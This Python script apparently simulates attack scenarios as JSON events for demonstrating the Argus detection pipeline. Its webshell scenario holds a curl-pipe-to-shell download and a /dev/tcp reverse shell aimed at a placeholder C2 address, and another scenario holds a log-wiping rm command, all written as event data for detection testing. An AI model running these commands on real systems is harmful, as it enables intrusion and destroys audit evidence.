#!/usr/bin/env python3
"""Argus attack simulator: replays realistic attack scenarios as events.

Each scenario emits events shaped to trip the Argus detection pack, so you
can demo the full pipeline: ingest -> rules -> anomaly -> enrichment ->
AI triage -> incidents -> playbooks.

Usage:
    python simulate.py --all
    python simulate.py bruteforce webshell --server http://localhost:8000
    python simulate.py --list
"""
import argparse
import json
import os
import sys
import time
import urllib.request
from datetime import datetime, timezone

SERVER = os.environ.get("ARGUS_SERVER", "http://localhost:8000")
API_KEY = os.environ.get("ARGUS_API_KEY", "argus-dev-key")
ATTACKER_IP = "203.0.113.5"   # TEST-NET: Argus mock intel flags it malicious
C2_IP = "198.51.100.99"


def now():
    return datetime.now(timezone.utc).isoformat()


def ev(agent, source, event, raw=None):
    return {"agent_id": agent, "hostname": agent, "os": "linux",
            "ts": now(), "source": source, "event": event, "raw": raw}


def post(events):
    body = json.dumps({"events": events}).encode()
    req = urllib.request.Request(
        SERVER + "/api/v1/events", data=body,
        headers={"X-API-Key": API_KEY, "content-type": "application/json"})
    with urllib.request.urlopen(req, timeout=15) as r:
        return json.loads(r.read())


# ---------------- scenarios ----------------

def bruteforce(a):
    """SSH password guessing -> ARG-1001 (+ playbook block_ip)."""
    out = []
    for i in range(8):
        out.append(ev(a, "auth",
                      {"service": "sshd", "user": "root", "src_ip": ATTACKER_IP,
                       "src_port": 41000 + i, "result": "failed", "port": 22},
                      f"Failed password for root from {ATTACKER_IP} port {41000+i} ssh2"))
    out.append(ev(a, "auth",
                  {"service": "sshd", "user": "root", "src_ip": ATTACKER_IP,
                   "src_port": 41100, "result": "success", "port": 22},
                  f"Accepted password for root from {ATTACKER_IP} port 41100 ssh2"))
    return out


def webshell(a):
    """Webshell + reverse shell + /tmp binary -> ARG-1006/1007/1008 + ARG-9002."""
    return [
        ev(a, "process", {"pid": 4242, "ppid": 1200, "exe": "/bin/sh",
                          "cmdline": "sh -c curl http://%s/payload.sh | sh" % C2_IP,
                          "user": "www-data", "action": "started"}),
        ev(a, "process", {"pid": 4243, "ppid": 4242, "exe": "/bin/bash",
                          "cmdline": "bash -i >& /dev/tcp/%s/4444 0>&1" % C2_IP,
                          "user": "www-data", "action": "started"}),
        ev(a, "process", {"pid": 4244, "ppid": 4243, "exe": "/tmp/.cache/kworker",
                          "cmdline": "/tmp/.cache/kworker --donate",
                          "user": "www-data", "action": "started"}),
        ev(a, "network", {"proto": "tcp", "src_ip": "10.0.1.15", "src_port": 51234,
                          "dst_ip": C2_IP, "dst_port": 4444,
                          "direction": "outbound", "action": "allowed", "bytes": 2048}),
    ]


def privesc(a):
    """Sudo abuse + su to root -> ARG-1003, ARG-1021."""
    return [
        ev(a, "syslog", {"program": "sudo", "level": "info",
                         "message": "www-data : TTY=pts/0 ; COMMAND=/bin/bash"}),
        ev(a, "auth", {"service": "su", "user": "root", "src_ip": "",
                       "result": "success"},
            "pam_unix(su:session): session opened for user root by www-data"),
    ]


def persistence(a):
    """Cron + systemd + authorized_keys -> ARG-1011, ARG-1022, ARG-1023."""
    return [
        ev(a, "fim", {"path": "/etc/cron.d/system-update", "action": "created",
                      "user": "root", "size": 96,
                      "sha256": "9f2c4a1b" * 8}),
        ev(a, "fim", {"path": "/etc/systemd/system/sysupdate.service",
                      "action": "created", "user": "root", "size": 210,
                      "sha256": "ee11aa22" * 8}),
        ev(a, "fim", {"path": "/root/.ssh/authorized_keys", "action": "modified",
                      "user": "root", "size": 412,
                      "sha256": "abcd1234" * 8}),
    ]


def exfil(a):
    """C2 beaconing + big upload -> ARG-1012, ARG-1013."""
    out = []
    for i in range(12):
        out.append(ev(a, "network",
                      {"proto": "tcp", "src_ip": "10.0.1.15", "src_port": 52000 + i,
                       "dst_ip": C2_IP, "dst_port": 4444,
                       "direction": "outbound", "action": "allowed", "bytes": 1500}))
    out.append(ev(a, "network",
                  {"proto": "tcp", "src_ip": "10.0.1.15", "src_port": 52100,
                   "dst_ip": C2_IP, "dst_port": 4444,
                   "direction": "outbound", "action": "allowed", "bytes": 250000000}))
    return out


def ransomware(a):
    """Mass file modification -> ARG-1020 (critical)."""
    return [ev(a, "fim", {"path": f"/home/app/docs/file_{i:03d}.docx",
                          "action": "modified", "user": "app", "size": 48210,
                          "sha256": ("%040x" % i)},
                raw="fim modified") for i in range(55)]


def defense_evasion(a):
    """Log wiping + auditd disable -> ARG-1016, ARG-1015."""
    return [
        ev(a, "syslog", {"program": "bash", "level": "info",
                         "message": "rm -f /var/log/auth.log /var/log/syslog"}),
        ev(a, "syslog", {"program": "auditd", "level": "info",
                         "message": "auditd halted: stop command received, terminating"}),
    ]


SCENARIOS = {
    "bruteforce": ("SSH brute force + first success", bruteforce),
    "webshell": ("Webshell, reverse shell, /tmp binary", webshell),
    "privesc": ("Sudo abuse and su to root", privesc),
    "persistence": ("Cron, systemd, authorized_keys", persistence),
    "exfil": ("C2 beaconing + large upload", exfil),
    "ransomware": ("Mass file modification burst", ransomware),
    "defense-evasion": ("Log wiping + auditd disabled", defense_evasion),
}


def main():
    global SERVER
    ap = argparse.ArgumentParser(description="Argus attack simulator")
    ap.add_argument("scenarios", nargs="*", help="scenario names or --all")
    ap.add_argument("--all", action="store_true")
    ap.add_argument("--list", action="store_true")
    ap.add_argument("--server", default=SERVER)
    ap.add_argument("--agent", default="web-01")
    ap.add_argument("--delay", type=float, default=0.4,
                    help="seconds between events (0 for instant)")
    args = ap.parse_args()
    SERVER = args.server.rstrip("/")

    if args.list:
        for name, (desc, _) in SCENARIOS.items():
            print(f"{name:16} {desc}")
        return

    names = list(SCENARIOS) if args.all else args.scenarios
    if not names:
        ap.error("give scenario names, --all, or --list")
    total_alerts = 0
    for name in names:
        if name not in SCENARIOS:
            print(f"unknown scenario: {name}", file=sys.stderr)
            continue
        desc, fn = SCENARIOS[name]
        events = fn(args.agent)
        print(f"[*] {name}: {desc} -> {len(events)} events", flush=True)
        batch, bid = [], 0
        for e in events:
            batch.append(e)
            if len(batch) >= 25:
                r = post(batch)
                total_alerts += r.get("new_alerts", 0)
                bid += 1
                batch = []
            if args.delay:
                time.sleep(args.delay)
        if batch:
            r = post(batch)
            total_alerts += r.get("new_alerts", 0)
        print(f"    done ({total_alerts} alerts so far)")
    print(f"\n[+] replayed {len(names)} scenario(s), {total_alerts} new alerts")
    print(f"[+] open {SERVER}/  (dashboard) or query /api/v1/alerts")


if __name__ == "__main__":
    main()
